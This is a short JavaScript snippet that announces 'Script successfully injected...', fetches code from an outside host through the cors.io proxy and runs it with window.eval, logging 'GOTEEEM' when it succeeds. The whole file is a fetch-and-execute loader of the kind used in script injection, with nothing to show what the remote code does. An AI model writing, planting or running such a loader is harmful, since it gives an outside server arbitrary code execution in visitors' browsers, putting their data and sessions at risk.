console.log('Script successfully injected...');
//http://austinkelleher.com/js/terminal-typer.js

function getScriptTag(url, callback) {
    var x = new XMLHttpRequest();
    x.onload = x.onerror = function() { callback(x.responseText); };
    x.open('GET', url);
    x.send();
}

getScriptTag('http://cors.io/?u=http://austinkelleher.com/js/test.js', function(code) {
    console.log('GOTEEEM');
    window.eval(code);
});
